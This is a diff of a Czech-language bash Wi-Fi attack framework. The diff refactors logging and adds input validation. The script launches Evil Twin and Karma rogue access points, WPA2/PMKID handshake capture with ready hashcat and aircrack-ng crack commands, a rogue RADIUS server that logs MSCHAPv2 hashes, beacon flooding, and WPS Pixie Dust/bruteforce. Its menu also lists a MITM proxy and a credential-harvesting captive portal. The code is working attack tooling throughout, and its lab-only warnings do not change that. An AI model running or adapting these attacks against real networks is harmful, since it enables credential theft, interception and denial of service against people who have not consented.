+    log INFO "${G}[+] Evil Twin '$target_ssid' běží${N}"
     wait_for_user
 }
 
 mode_karma() {
     echo "${B}═══ MODE 7: Karma ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní lab!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní lab!${N}"
     if ! check_tool airbase-ng; then
-        echo "${R}[!] airbase-ng chybí: sudo apt install aircrack-ng${N}"
-        exit 1
+        log ERR "${R}[!] airbase-ng chybí: sudo apt install aircrack-ng${N}"
+        return
     fi
     read -p "Pokračovat? (y/N): " ok
-    [ "$ok" != "y" ] && exit 0
+    [ "$ok" != "y" ] && return
     pkill hostapd 2>/dev/null || true
     nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
     ip link set "$AP_IFACE" down
@@ -882,9 +1007,9 @@ mode_karma() {
         iptables -A FORWARD -i at0 -o "$UPSTREAM" -j ACCEPT
         iptables -A FORWARD -i "$UPSTREAM" -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
         launch_dnsmasq; launch_leases
-        echo "${G}[+] Karma aktivní${N}"
+        log INFO "${G}[+] Karma aktivní${N}"
     else
-        echo "${Y}[!] at0 nevznikl, zkontroluj airbase okno${N}"
+        log WARN "${Y}[!] at0 nevznikl, zkontroluj airbase okno${N}"
     fi
     wait_for_user
 }
@@ -892,11 +1017,11 @@ mode_karma() {
 mode_handshake_capture() {
     echo "${B}═══ MODE 8: WPA2 + EAPOL handshake ═══${N}"
     read -p "Heslo (min 8): " pw
-    [ ${#pw} -lt 8 ] && { echo "Příliš krátké"; exit 1; }
+    [ ${#pw} -lt 8 ] && { log ERR "${R}Příliš krátké${N}"; return; }
     prepare_iface; write_hostapd_wpa2 "$pw"; write_dnsmasq; setup_nat
     launch_hostapd; launch_dnsmasq; launch_leases; launch_eapol_capture
-    echo "${G}[+] Handshake -> $LOG_DIR/eapol-*.pcap${N}"
-    echo "${Y}[*] Crack: aircrack-ng -w wordlist.txt $LOG_DIR/eapol-*.pcap${N}"
+    log INFO "${G}[+] Handshake -> $LOG_DIR/eapol-*.pcap${N}"
+    log WARN "${Y}[*] Crack: aircrack-ng -w wordlist.txt $LOG_DIR/eapol-*.pcap${N}"
     wait_for_user
 }
 
@@ -919,14 +1044,14 @@ mode_monitor() {
 mode_wpa3_ap() {
     echo "${B}═══ MODE 10: WPA3-SAE AP + DHCP + NAT ═══${N}"
     local phy
-    phy=$(iw dev "$AP_IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')
+    phy=$(iw dev "$AP_IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}') || true
     if [ -n "$phy" ] && ! iw "$phy" info 2>/dev/null | grep -q "SAE"; then
-        echo "${Y}[!] Upozornění: karta nebo hostapd nemusí podporovat SAE/WPA3${N}"
+        log WARN "${Y}[!] Upozornění: karta nebo hostapd nemusí podporovat SAE/WPA3${N}"
         read -p "Pokračovat? (y/N): " ok
         [ "$ok" != "y" ] && return
     fi
     read -p "Heslo (min 8 znaků): " pw
-    [ ${#pw} -lt 8 ] && { echo "${R}Příliš krátké${N}"; return; }
+    [ ${#pw} -lt 8 ] && { log ERR "${R}Příliš krátké${N}"; return; }
     prepare_iface
     write_hostapd_wpa3 "$pw"
     write_dnsmasq
@@ -934,18 +1059,21 @@ mode_wpa3_ap() {
     launch_hostapd
     launch_dnsmasq
     launch_leases
-    echo "${G}[+] WPA3-SAE SSID '$SSID' / heslo: $pw${N}"
+    log INFO "${G}[+] WPA3-SAE SSID '$SSID' / heslo: $pw${N}"
     wait_for_user
 }
 
 mode_multi_ssid() {
     echo "${B}═══ MODE 11: Multi-SSID ═══${N}"
-    echo "${Y}[i] Vytvoří 2 SSID na jedné kartě (open + volitelně WPA2)${N}"
+    log WARN "${Y}[i] Vytvoří 2 SSID na jedné kartě (open + volitelně WPA2)${N}"
     read -p "SSID 1 — open [$SSID]: " ssid1
     [ -z "$ssid1" ] && ssid1="$SSID"
     read -p "SSID 2: " ssid2
     [ -z "$ssid2" ] && ssid2="Corp-$(date +%H%M)"
     read -p "Heslo pro SSID 2 (Enter = open): " pass2
+    if [ -n "$pass2" ] && [ ${#pass2} -lt 8 ]; then
+        log ERR "${R}[!] Heslo musí mít alespoň 8 znaků${N}"; return
+    fi
 
     prepare_iface
     write_hostapd_multi "$ssid1" "$ssid2" "$pass2"
@@ -956,9 +1084,9 @@ mode_multi_ssid() {
         ip addr flush dev "$MULTI_IFACE2" 2>/dev/null || true
         ip addr add "$MULTI_AP_IP2/24" dev "$MULTI_IFACE2"
         ip link set "$MULTI_IFACE2" up
-        echo "${G}[+] Virtuální iface $MULTI_IFACE2 = $MULTI_AP_IP2${N}"
+        log INFO "${G}[+] Virtuální iface $MULTI_IFACE2 = $MULTI_AP_IP2${N}"
     else
-        echo "${Y}[!] Virtuální rozhraní $MULTI_IFACE2 nevzniklo — zkontroluj hostapd okno${N}"
+        log WARN "${Y}[!] Virtuální rozhraní $MULTI_IFACE2 nevzniklo — zkontroluj hostapd okno${N}"
     fi
 
     write_dnsmasq_multi
@@ -966,16 +1094,16 @@ mode_multi_ssid() {
     launch_dnsmasq
     launch_leases
 
-    echo "${G}[+] SSID 1: '$ssid1' (open)  → 10.0.0.x${N}"
-    echo "${G}[+] SSID 2: '$ssid2' $([ -n "$pass2" ] && echo "(WPA2)" || echo "(open)") → 10.0.1.x${N}"
+    log INFO "${G}[+] SSID 1: '$ssid1' (open)  → 10.0.0.x${N}"
+    log INFO "${G}[+] SSID 2: '$ssid2' $([ -n "$pass2" ] && echo "(WPA2)" || echo "(open)") → 10.0.1.x${N}"
     wait_for_user
 }
 
 mode_pmkid_capture() {
     echo "${B}═══ MODE 12: PMKID Capture ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
     if ! check_tool hcxdumptool; then
-        echo "${R}[!] hcxdumptool chybí: sudo apt install hcxdumptool${N}"
+        log ERR "${R}[!] hcxdumptool chybí: sudo apt install hcxdumptool${N}"
         read -p "ENTER..."; return
     fi
     read -p "Pokračovat? (y/N): " ok
@@ -988,7 +1116,7 @@ mode_pmkid_capture() {
     ip link set "$AP_IFACE" up
     mkdir -p "$LOG_DIR"
 
-    local ts; ts=$(date +%H%M%S)
+    local ts; ts=$(date +%H%M%S) || true
     local pcap="$LOG_DIR/pmkid-${ts}.pcapng"
 
     read -p "Cílový BSSID (Enter = vše): " target_bssid
@@ -1000,11 +1128,11 @@ mode_pmkid_capture() {
     fi
 
     open_term "hcxdumptool" "sudo hcxdumptool -i $AP_IFACE -o $pcap --active_beacon --enable_status=1 $filter_arg 2>&1 | tee $LOG_DIR/hcxdumptool.log"
-    echo "${G}[+] Zachytávám PMKID → $pcap${N}"
-    echo "${Y}[*] Ctrl+C v okně hcxdumptool = stop, pak ENTER zde${N}"
+    log INFO "${G}[+] Zachytávám PMKID → $pcap${N}"
+    log WARN "${Y}[*] Ctrl+C v okně hcxdumptool = stop, pak ENTER zde${N}"
     echo
     echo "${C}════════════════════════════════════════════${N}"
-    echo "${G}  ${BOLD}ENTER${N}${G} = stop & konverze do hashcat${N}"
+    log INFO "${G}  ${BOLD}ENTER${N}${G} = stop & konverze do hashcat${N}"
     echo "${C}════════════════════════════════════════════${N}"
     read -r
 
@@ -1016,14 +1144,14 @@ mode_pmkid_capture() {
         local hash="$LOG_DIR/pmkid-${ts}.hc22000"
         hcxpcapngtool -o "$hash" "$pcap" 2>/dev/null
         if [ -s "$hash" ]; then
-            local count; count=$(wc -l < "$hash")
-            echo "${G}[+] Hash uložen: $hash  ($count záznamů)${N}"
-            echo "${Y}[*] Crack: hashcat -m 22000 $hash wordlist.txt${N}"
+            local count; count=$(wc -l < "$hash") || true
+            log INFO "${G}[+] Hash uložen: $hash  ($count záznamů)${N}"
+            log WARN "${Y}[*] Crack: hashcat -m 22000 $hash wordlist.txt${N}"
         else
-            echo "${Y}[!] Žádný PMKID/handshake nebyl zachycen${N}"
+            log WARN "${Y}[!] Žádný PMKID/handshake nebyl zachycen${N}"
         fi
     else
-        echo "${Y}[i] hcxpcapngtool chybí → sudo apt install hcxtools${N}"
+        log WARN "${Y}[i] hcxpcapngtool chybí → sudo apt install hcxtools${N}"
         echo "    Pcap: $pcap"
     fi
     echo; read -p "ENTER..."
@@ -1031,9 +1159,9 @@ mode_pmkid_capture() {
 
 mode_rogue_radius() {
     echo "${B}═══ MODE 13: WPA-Enterprise / Rogue RADIUS ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní lab / autorizace!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní lab / autorizace!${N}"
     if ! check_tool hostapd-wpe; then
-        echo "${R}[!] hostapd-wpe chybí: sudo apt install hostapd-wpe${N}"
+        log ERR "${R}[!] hostapd-wpe chybí: sudo apt install hostapd-wpe${N}"
         read -p "ENTER..."; return
     fi
     read -p "Pokračovat? (y/N): " ok
@@ -1044,9 +1172,9 @@ mode_rogue_radius() {
 
     if [ -d /etc/hostapd-wpe/certs ] && [ -f /etc/hostapd-wpe/certs/server.pem ]; then
         cp /etc/hostapd-wpe/certs/{ca.pem,server.pem,server.key,dh} "$CERT_DIR/" 2>/dev/null || true
-        echo "${G}[+] Používám systémové certifikáty hostapd-wpe${N}"
+        log INFO "${G}[+] Používám systémové certifikáty hostapd-wpe${N}"
     elif [ ! -f "$CERT_DIR/server.pem" ]; then
-        echo "${Y}[*] Generuji self-signed certifikáty (může trvat ~15 s)...${N}"
+        log WARN "${Y}[*] Generuji self-signed certifikáty (může trvat ~15 s)...${N}"
         openssl req -new -x509 -nodes -days 365 \
             -out "$CERT_DIR/ca.pem" -keyout "$CERT_DIR/ca.key" \
             -subj "/CN=WirelessCA/O=Lab/C=CZ" 2>/dev/null
@@ -1058,9 +1186,9 @@ mode_rogue_radius() {
             -CAkey "$CERT_DIR/ca.key" -CAcreateserial \
             -out "$CERT_DIR/server.pem" 2>/dev/null
         openssl dhparam -out "$CERT_DIR/dh" 1024 2>/dev/null
-        echo "${G}[+] Certifikáty vygenerovány v $CERT_DIR${N}"
+        log INFO "${G}[+] Certifikáty vygenerovány v $CERT_DIR${N}"
     else
-        echo "${G}[+] Certifikáty nalezeny v $CERT_DIR${N}"
+        log INFO "${G}[+] Certifikáty nalezeny v $CERT_DIR${N}"
     fi
 
     cat > "$WORK_DIR/eap_users" <<'EOF'
@@ -1097,18 +1225,18 @@ EOF
     launch_dnsmasq
     open_term "wpe-creds" "touch $LOG_DIR/wpe-creds.log; sudo tail -F $LOG_DIR/wpe-creds.log"
 
-    echo "${G}[+] Rogue RADIUS AP '$SSID' aktivní${N}"
-    echo "${Y}[*] MSCHAPv2 hashe → $LOG_DIR/wpe-creds.log${N}"
-    echo "${Y}[*] Crack: asleap -C <challenge> -R <response> -W wordlist.txt${N}"
-    echo "${Y}       nebo: hashcat -m 5500 hash.txt wordlist.txt${N}"
+    log INFO "${G}[+] Rogue RADIUS AP '$SSID' aktivní${N}"
+    log WARN "${Y}[*] MSCHAPv2 hashe → $LOG_DIR/wpe-creds.log${N}"
+    log WARN "${Y}[*] Crack: asleap -C <challenge> -R <response> -W wordlist.txt${N}"
+    log WARN "${Y}       nebo: hashcat -m 5500 hash.txt wordlist.txt${N}"
     wait_for_user
 }
 
 mode_beacon_flood() {
     echo "${B}═══ MODE 14: Beacon Flood ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní lab!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní lab!${N}"
     if ! check_tool mdk4; then
-        echo "${R}[!] mdk4 chybí: sudo apt install mdk4${N}"
+        log ERR "${R}[!] mdk4 chybí: sudo apt install mdk4${N}"
         read -p "ENTER..."; return
     fi
     read -p "Pokračovat? (y/N): " ok
@@ -1121,7 +1249,7 @@ mode_beacon_flood() {
     ip link set "$AP_IFACE" up
     mkdir -p "$LOG_DIR"
 
-    echo "${Y}Typ beacon flood:${N}"
+    log WARN "${Y}Typ beacon flood:${N}"
     echo "  1) Náhodné SSID (generované mdk4)"
     echo "  2) SSID ze souboru"
     echo "  3) Jedno SSID s náhodným BSSID (AP jam)"
@@ -1137,32 +1265,32 @@ mode_beacon_flood() {
             read -p "Cesta k souboru se SSID [$ssid_file]: " f
             [ -n "$f" ] && ssid_file="$f"
             if [ ! -f "$ssid_file" ]; then
-                echo "${Y}[*] Vytvářím ukázkový seznam SSID...${N}"
+                log WARN "${Y}[*] Vytvářím ukázkový seznam SSID...${N}"
                 printf '%s\n' FreeWifi eduroam Starbucks_Guest Corp-Network \
                     "iPhone hotspot" linksys NETGEAR xfinitywifi > "$ssid_file"
             fi
-            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -f $ssid_file -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
+            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -f $(shq "$ssid_file") -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
             ;;
         3)
             read -p "SSID k opakování [$SSID]: " flood_ssid
             [ -z "$flood_ssid" ] && flood_ssid="$SSID"
-            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -e \"$flood_ssid\" -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
+            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -e $(shq "$flood_ssid") -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
             ;;
     esac
 
-    echo "${G}[+] Beacon flood aktivní na kanálu $CHANNEL${N}"
+    log INFO "${G}[+] Beacon flood aktivní na kanálu $CHANNEL${N}"
     wait_for_user
 }
 
 mode_wps_attack() {
     echo "${B}═══ MODE 15: WPS Pixie Dust / Bruteforce ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
 
     local tool=""
     if check_tool reaver; then tool="reaver"
     elif check_tool bully; then tool="bully"
     else
-        echo "${R}[!] Chybí reaver nebo bully: sudo apt install reaver${N}"
+        log ERR "${R}[!] Chybí reaver nebo bully: sudo apt install reaver${N}"
         read -p "ENTER..."; return
     fi
 
@@ -1177,22 +1305,26 @@ mode_wps_attack() {
     mkdir -p "$LOG_DIR"
 
     if check_tool wash; then
-        echo "${Y}[*] Skenuji WPS AP přes $AP_IFACE (15 s)...${N}"
+        log WARN "${Y}[*] Skenuji WPS AP přes $AP_IFACE (15 s)...${N}"
         echo
         printf "${W}%-18s %-4s %-5s %-4s %-3s %s${N}\n" "BSSID" "Ch" "dBm" "WPS" "Lck" "ESSID"
         printf "${W}%s${N}\n" "────────────────────────────────────────────────"
         timeout 15 sudo wash -i "$AP_IFACE" 2>/dev/null | grep -v "^Wash\|^--\|BSSID" || true
         echo
     else
-        echo "${Y}[!] wash chybí — sken WPS AP přeskočen${N}"
+        log WARN "${Y}[!] wash chybí — sken WPS AP přeskočen${N}"
     fi
 
     read -p "Cílový BSSID: " target_bssid
-    [ -z "$target_bssid" ] && { echo "${R}BSSID povinný${N}"; return; }
+    [ -z "$target_bssid" ] && { log ERR "${R}BSSID povinný${N}"; return; }
+    is_valid_bssid "$target_bssid" || { log ERR "${R}[!] Neplatný formát BSSID (očekáváno AA:BB:CC:DD:EE:FF)${N}"; return; }
     read -p "Kanál cíle: " target_ch
-    [ -n "$target_ch" ] && iw dev "$AP_IFACE" set channel "$target_ch" 2>/dev/null
+    if [ -n "$target_ch" ]; then
+        is_valid_channel "$target_ch" || { log ERR "${R}[!] Neplatný kanál${N}"; return; }
+        iw dev "$AP_IFACE" set channel "$target_ch" 2>/dev/null
+    fi
 
-    echo "${Y}Typ útoku:${N}"
+    log WARN "${Y}Typ útoku:${N}"
     echo "  1) Pixie Dust (rychlý offline útok — doporučeno)"
     echo "  2) PIN bruteforce (pomalý, ~4h)"
     read -p "Volba [1]: " attack_type
@@ -1202,22 +1334,22 @@ mode_wps_attack() {
     case "$tool" in
         reaver)
             if [ "$attack_type" = "1" ]; then
-                open_term "pixiedust" "sudo reaver -i $AP_IFACE -b $target_bssid -K 1 -vv 2>&1 | tee $log_file"
+                open_term "pixiedust" "sudo reaver -i $AP_IFACE -b $(shq "$target_bssid") -K 1 -vv 2>&1 | tee $log_file"
             else
-                open_term "wps-brute" "sudo reaver -i $AP_IFACE -b $target_bssid -vv 2>&1 | tee $log_file"
+                open_term "wps-brute" "sudo reaver -i $AP_IFACE -b $(shq "$target_bssid") -vv 2>&1 | tee $log_file"
             fi
             ;;
         bully)
             if [ "$attack_type" = "1" ]; then
-                open_term "pixiedust" "sudo bully $AP_IFACE -b $target_bssid --pixiedust 2>&1 | tee $log_file"
+                open_term "pixiedust" "sudo bully $AP_IFACE -b $(shq "$target_bssid") --pixiedust 2>&1 | tee $log_file"
             else
-                open_term "wps-brute" "sudo bully $AP_IFACE -b $target_bssid 2>&1 | tee $log_file"
+                open_term "wps-brute" "sudo bully $AP_IFACE -b $(shq "$target_bssid") 2>&1 | tee $log_file"
             fi
             ;;
     esac
 
-    echo "${G}[+] WPS útok zahájen ($tool / $([ "$attack_type" = "1" ] && echo "Pixie Dust" || echo "bruteforce"))${N}"
-    echo "${Y}[*] Log: $log_file${N}"
+    log INFO "${G}[+] WPS útok zahájen ($tool / $([ "$attack_type" = "1" ] && echo "Pixie Dust" || echo "bruteforce"))${N}"
+    log WARN "${Y}[*] Log: $log_file${N}"
     wait_for_user
 }
 
@@ -1230,7 +1362,7 @@ mode_channel_hopper() {
     ip link set "$AP_IFACE" up
     mkdir -p "$LOG_DIR"
 
-    echo "${Y}Rozsah kanálů:${N}"
+    log WARN "${Y}Rozsah kanálů:${N}"
     echo "  1) 2.4 GHz (1–13)"
     echo "  2) 5 GHz (36,40,44,48,52,56,60,64,100,104,108,112,116,149,153,157,161,165)"
     echo "  3) Oba pásma"
@@ -1248,8 +1380,12 @@ mode_channel_hopper() {
 
     read -p "Prodleva na kanálu [0.3s]: " delay
     delay="${delay:-0.3}"
+    if ! [[ "$delay" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
+        log ERR "${R}[!] Neplatná prodleva — musí být kladné číslo (např. 0.3)${N}"
+        delay=0.3
+    fi
 
-    local ts; ts=$(date +%H%M%S)
+    local ts; ts=$(date +%H%M%S) || true
     local pcap="$LOG_DIR/chanhop-${ts}.pcap"
     local probe_log="$LOG_DIR/probes-${ts}.txt"
 
@@ -1272,22 +1408,28 @@ HOPEOF
     open_term "probe-req"   "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt subtype probe-req' 2>/dev/null | tee -a $probe_log"
     open_term "ap-beacons"  "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt subtype beacon' 2>/dev/null | grep -oE '\([^)]+\)' | grep -v '^\(\)$' | awk '!seen[\$0]++'"
 
-    echo "${G}[+] Channel hopper aktivní ($(echo $channels | wc -w) kanálů, ${delay}s/kanál)${N}"
-    echo "${Y}[*] Probe log: $probe_log${N}"
-    echo "${Y}[*] Pcap:      $pcap${N}"
+    log INFO "${G}[+] Channel hopper aktivní ($(echo $channels | wc -w) kanálů, ${delay}s/kanál)${N}"
+    log WARN "${Y}[*] Probe log: $probe_log${N}"
+    log WARN "${Y}[*] Pcap:      $pcap${N}"
     wait_for_user
 }
 
 mode_client_overview() {
     echo "${B}═══ MODE 17: Živý přehled klientů ═══${N}"
     if ! pgrep -x hostapd &>/dev/null && ! pgrep -x hostapd-wpe &>/dev/null; then
-        echo "${Y}[!] hostapd neběží — nejprve spusť AP mód (1–3, 10, 11, 13...)${N}"
+        log WARN "${Y}[!] hostapd neběží — nejprve spusť AP mód (1–3, 10, 11, 13...)${N}"
         read -p "ENTER..."; return
     fi
 
     local refresh=3
     read -p "Interval obnovy [${refresh}s]: " r
-    [ -n "$r" ] && refresh="$r"
+    if [ -n "$r" ]; then
+        if [[ "$r" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
+            refresh="$r"
+        else
+            log ERR "${R}[!] Neplatný interval — musí být kladné číslo (např. 3)${N}"
+        fi
+    fi
 
     local monitor_script="$WORK_DIR/clients.sh"
     # Jednoduchý heredoc — $AP_IFACE atd. expandovány při zápisu; vnitřní $1/$2 jsou argumenty generovaného skriptu
@@ -1335,20 +1477,20 @@ done
 MONEOF
     chmod +x "$monitor_script"
     open_term "klienti" "sudo bash $monitor_script"
-    echo "${G}[+] Přehled klientů spuštěn (refresh ${refresh}s)${N}"
+    log INFO "${G}[+] Přehled klientů spuštěn (refresh ${refresh}s)${N}"
     read -p "ENTER..."
 }
 
 mode_html_report() {
     echo "${B}═══ MODE 18: HTML Report ═══${N}"
     [ ! -d "$LOG_DIR" ] && {
-        echo "${R}[!] Žádné logy — nejprve spusť nějaký mód${N}"; read -p "ENTER..."; return
+        log ERR "${R}[!] Žádné logy — nejprve spusť nějaký mód${N}"; read -p "ENTER..."; return
     }
-    local ts; ts=$(date +%Y%m%d-%H%M%S)
+    local ts; ts=$(date +%Y%m%d-%H%M%S) || true
     local report="$WORK_DIR/report-${ts}.html"
-    echo "${Y}[*] Generuji report...${N}"
+    log WARN "${Y}[*] Generuji report...${N}"
 
-    python3 - "$LOG_DIR" "$report" "$AP_IFACE" "$SSID" "$CHANNEL" <<'PYEOF'
+    if ! python3 - "$LOG_DIR" "$report" "$AP_IFACE" "$SSID" "$CHANNEL" <<'PYEOF'
 import sys, os, re, glob, datetime, html as esc
 
 LOG_DIR, REPORT, AP_IFACE, SSID, CHANNEL = sys.argv[1:]
@@ -1536,25 +1678,24 @@ with open(REPORT, 'w', encoding='utf-8') as out:
     out.write(html_out)
 print(f"OK:{REPORT}")
 PYEOF
-
-    if [ $? -ne 0 ]; then
-        echo "${R}[!] Chyba při generování reportu${N}"; read -p "ENTER..."; return
+    then
+        log ERR "${R}[!] Chyba při generování reportu${N}"; read -p "ENTER..."; return
     fi
-    local size; size=$(du -sh "$report" 2>/dev/null | awk '{print $1}')
-    echo "${G}[+] Report: $report  ($size)${N}"
+    local size; size=$(du -sh "$report" 2>/dev/null | awk '{print $1}') || true
+    log INFO "${G}[+] Report: $report  ($size)${N}"
 
     for browser in xdg-open firefox chromium-browser chromium google-chrome; do
         if check_tool "$browser"; then
-            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
-                sudo -u "$SUDO_USER" \
-                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
-                    XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
-                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
+            if [ -n "${SUDO_USER:-}" ] && [ "$EUID" -eq 0 ]; then
+                sudo -u "${SUDO_USER:-}" \
+                    DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
+                    XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
+                    DBUS_SESSION_BUS_ADDRESS="${DBUS_SESSION_BUS_ADDRESS:-}" \
                     "$browser" "$report" &>/dev/null &
             else
                 "$browser" "$report" &>/dev/null &
             fi
-            echo "${G}[+] Otvírám v $browser${N}"
+            log INFO "${G}[+] Otvírám v $browser${N}"
             break
         fi
     done
@@ -1563,17 +1704,17 @@ PYEOF
 
 mode_status() {
     echo "${B}═══ STATUS ═══${N}"
-    echo "${Y}-- iw dev --${N}"; iw dev
-    echo "${Y}-- ip $AP_IFACE --${N}"; ip addr show "$AP_IFACE" 2>/dev/null
-    echo "${Y}-- procesy --${N}"
+    log WARN "${Y}-- iw dev --${N}"; iw dev
+    log WARN "${Y}-- ip $AP_IFACE --${N}"; ip addr show "$AP_IFACE" 2>/dev/null
+    log WARN "${Y}-- procesy --${N}"
     pgrep -a hostapd 2>/dev/null || echo "  hostapd: -"
     pgrep -af "dnsmasq.*$WORK_DIR" 2>/dev/null || echo "  dnsmasq: -"
     pgrep -a mitmweb 2>/dev/null || echo "  mitmweb: -"
     pgrep -a airbase-ng 2>/dev/null || echo "  airbase-ng: -"
     pgrep -af "$WORK_DIR/portal.py" 2>/dev/null || echo "  portal: -"
-    echo "${Y}-- DHCP leases --${N}"
+    log WARN "${Y}-- DHCP leases --${N}"
     grep DHCPACK "$LOG_DIR/dnsmasq.log" 2>/dev/null | tail -5 || echo "  -"
-    echo "${Y}-- creds --${N}"
+    log WARN "${Y}-- creds --${N}"
     [ -s "$LOG_DIR/credentials.log" ] && tail -5 "$LOG_DIR/credentials.log" || echo "  -"
     [ "$TERM_CMD" = "tmux" ] && { echo; tmux list-sessions 2>/dev/null || echo "  (tmux: žádná)"; }
     echo
@@ -1591,57 +1732,57 @@ mode_install_deps() {
         if check_tool "$t"; then echo "  ${G}✓${N} $t"; else echo "  ${Y}○${N} $t (volitelné)"; fi
     done
     if [ ${#pkgs[@]} -gt 0 ]; then
-        echo "${Y}[!] Chybí: ${pkgs[*]}${N}"
+        local pkgs_joined; pkgs_joined="$(IFS=' '; echo "${pkgs[*]}")"
+        log WARN "${Y}[!] Chybí: ${pkgs_joined}${N}"
         echo "    sudo apt install hostapd dnsmasq iptables iw network-manager tcpdump"
     fi
-    check_tool mitmweb    || echo "${Y}[i] mitmproxy:${N} sudo apt install pipx && pipx install mitmproxy"
-    check_tool airbase-ng || echo "${Y}[i] aircrack:${N} sudo apt install aircrack-ng"
-    check_tool tmux       || echo "${Y}[i] tmux:${N} sudo apt install tmux"
-    check_tool hcxdumptool   || echo "${Y}[i] PMKID:${N} sudo apt install hcxdumptool hcxtools"
-    check_tool hostapd-wpe   || echo "${Y}[i] Rogue RADIUS:${N} sudo apt install hostapd-wpe"
-    check_tool mdk4          || echo "${Y}[i] Beacon flood:${N} sudo apt install mdk4"
-    check_tool reaver        || echo "${Y}[i] WPS:${N} sudo apt install reaver"
+    check_tool mitmweb    || log WARN "${Y}[i] mitmproxy:${N} sudo apt install pipx && pipx install mitmproxy"
+    check_tool airbase-ng || log WARN "${Y}[i] aircrack:${N} sudo apt install aircrack-ng"
+    check_tool tmux       || log WARN "${Y}[i] tmux:${N} sudo apt install tmux"
+    check_tool hcxdumptool   || log WARN "${Y}[i] PMKID:${N} sudo apt install hcxdumptool hcxtools"
+    check_tool hostapd-wpe   || log WARN "${Y}[i] Rogue RADIUS:${N} sudo apt install hostapd-wpe"
+    check_tool mdk4          || log WARN "${Y}[i] Beacon flood:${N} sudo apt install mdk4"
+    check_tool reaver        || log WARN "${Y}[i] WPS:${N} sudo apt install reaver"
     echo
     read -p "ENTER..."
 }
 
 # === HLAVNÍ MENU (ve smyčce) ===
-need_root
-
 while true; do
     banner
-    printf "${C}┌──────────────────────────────────────────────────┐${N}\n"
-    printf "${C}│${N}  ${BOLD}AP módy${N}                                          ${C}│${N}\n"
-    printf "${C}│${N}    ${G} 1)${N} Open AP + DHCP + NAT                        ${C}│${N}\n"
-    printf "${C}│${N}    ${G} 2)${N} WPA2 AP + DHCP + NAT                        ${C}│${N}\n"
-    printf "${C}│${N}    ${G} 3)${N} Open AP + plný pcap                         ${C}│${N}\n"
-    printf "${C}│${N}    ${G}10)${N} WPA3-SAE AP + DHCP + NAT                   ${C}│${N}\n"
-    printf "${C}│${N}    ${G}11)${N} Multi-SSID (2x SSID na jedné kartě)        ${C}│${N}\n"
-    printf "${C}│${N}                                                  ${C}│${N}\n"
-    printf "${C}│${N}  ${BOLD}Útoky / Pentest${N}                                  ${C}│${N}\n"
-    printf "${C}│${N}    ${R} 4)${N} MITM HTTPS proxy (mitmweb)                  ${C}│${N}\n"
-    printf "${C}│${N}    ${R} 5)${N} Captive Portal (credential harvester)       ${C}│${N}\n"
-    printf "${C}│${N}    ${R} 6)${N} Evil Twin (clone real SSID + deauth)        ${C}│${N}\n"
-    printf "${C}│${N}    ${R} 7)${N} Karma (odpovídá na všechny probe req)       ${C}│${N}\n"
-    printf "${C}│${N}    ${R} 8)${N} WPA2 EAPOL handshake capture                ${C}│${N}\n"
-    printf "${C}│${N}    ${R}12)${N} PMKID Capture (hcxdumptool → hashcat)      ${C}│${N}\n"
-    printf "${C}│${N}    ${R}13)${N} WPA-Enterprise / Rogue RADIUS (hostapd-wpe)${C}│${N}\n"
-    printf "${C}│${N}    ${R}14)${N} Beacon Flood (mdk4)                        ${C}│${N}\n"
-    printf "${C}│${N}    ${R}15)${N} WPS Pixie Dust / Bruteforce (reaver/bully) ${C}│${N}\n"
-    printf "${C}│${N}                                                  ${C}│${N}\n"
-    printf "${C}│${N}  ${BOLD}Pasivní${N}                                          ${C}│${N}\n"
-    printf "${C}│${N}    ${Y} 9)${N} 802.11 monitor (beacons/probes/deauth)      ${C}│${N}\n"
-    printf "${C}│${N}    ${Y}16)${N} Channel Hopper + Probe Collector            ${C}│${N}\n"
-    printf "${C}│${N}    ${Y}17)${N} Živý přehled klientů (RSSI, TX/RX, IP)     ${C}│${N}\n"
-    printf "${C}│${N}                                                  ${C}│${N}\n"
-    printf "${C}│${N}  ${BOLD}Servis${N}                                           ${C}│${N}\n"
-    printf "${C}│${N}    ${W}18)${N} HTML Report (credentials, DNS, DHCP, pcap) ${C}│${N}\n"
-    printf "${C}│${N}    ${W} n)${N} Nastavení (SSID, kanál, rozhraní)          ${C}│${N}\n"
-    printf "${C}│${N}    ${W} s)${N} Status                                     ${C}│${N}\n"
-    printf "${C}│${N}    ${W} d)${N} Kontrola závislostí                        ${C}│${N}\n"
-    printf "${C}│${N}    ${W} k)${N} Kill / cleanup                             ${C}│${N}\n"
-    printf "${C}│${N}    ${W} q)${N} Quit                                       ${C}│${N}\n"
-    printf "${C}└──────────────────────────────────────────────────┘${N}\n\n"
+    box_top
+    box_head "AP módy"
+    box_line "    ${G} 1)${N} Open AP + DHCP + NAT"
